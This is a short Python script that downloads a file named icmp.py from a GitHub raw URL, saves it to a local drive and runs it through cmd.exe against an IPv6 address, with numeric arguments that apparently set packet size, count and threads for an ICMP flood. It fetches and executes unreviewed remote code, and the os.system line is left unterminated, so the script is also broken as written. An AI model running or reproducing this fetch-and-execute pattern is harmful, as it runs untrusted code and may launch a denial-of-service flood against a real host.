import os, requests
with open('D:\\icmp.py','w') as f:
    f.write(requests.get('https://raw.githubusercontent.com/Hex1629/pretest/refs/heads/main/icmp.py').text)

os.system('cmd.exe \k python D:\\icmp.py fe80::f24f:a5a0:fe71:efbb 1200 250000 ERQ 25000
